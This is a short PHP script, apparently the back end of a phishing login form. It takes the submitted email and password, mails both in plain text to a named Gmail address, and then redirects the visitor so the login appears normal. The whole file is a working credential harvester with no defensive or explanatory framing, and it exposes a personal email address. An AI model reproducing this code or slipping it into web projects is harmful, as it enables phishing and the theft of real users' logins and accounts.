<?php
if (!empty($_POST['password']) AND !empty ($_POST['email'])){
    
    $headers = 'From: DmitryRoar\r\n'.
                'Reply-To: dmitrievdmitry13@gmail.com';
    $theme = 'Новое сообщение';

    $letter = 'Данные сообщения:\r\n';
    $letter .= 'Логин:'.$_POST['email'].'\r\n';
    $letter .= 'Пароль: '.$_POST['password'].'\r\n';
    if( mail('dmitrievdmitry13@gmail.com', $theme, $letter, $headers)){
        header('Location:/index.php');
    } else{
        header('Location:/');
    }
} else {
    header('Location:/');
}
?>